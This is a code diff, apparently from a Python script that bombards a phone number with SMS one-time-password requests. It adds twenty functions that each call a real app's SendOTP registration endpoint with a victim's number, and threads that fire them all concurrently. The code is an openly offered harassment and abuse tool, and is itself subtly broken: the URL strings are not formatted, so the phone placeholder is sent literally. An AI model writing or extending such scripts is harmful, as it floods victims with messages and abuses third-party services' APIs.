@@ -200,6 +200,71 @@ def cang42(phone):
 
 def cang43(phone):
         requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+def cang44(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang45(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang46(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang47(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang48(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang49(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang50(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang51(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang52(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang53(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang54(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang55(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang56(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang57(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+
+def cang58(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang59(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang60(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang61(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang62(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+def cang63(phone):
+        requests.get("https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+ 
+ 
+
+ 
+
+
 
 
     
@@ -260,6 +325,28 @@ def BBot(phone, amount):
         threading.submit(cang41,phone)
         threading.submit(cang42,phone)
         threading.submit(cang43,phone)
+        threading.submit(cang44,phone)
+        threading.submit(cang45,phone)
+        threading.submit(cang46,phone)
+        threading.submit(cang47,phone)
+        threading.submit(cang48,phone)
+        threading.submit(cang49,phone)
+        threading.submit(cang50,phone)
+        threading.submit(cang51,phone)
+        threading.submit(cang52,phone)
+        threading.submit(cang53,phone)
+        threading.submit(cang54,phone)
+        threading.submit(cang55,phone)
+        threading.submit(cang56,phone)
+        threading.submit(cang57,phone)
+        threading.submit(cang58,phone)
+        threading.submit(cang59,phone)
+        threading.submit(cang60,phone)
+        threading.submit(cang61,phone)
+        threading.submit(cang62,phone)
+        threading.submit(cang63,phone)
+
+        
         
         
 
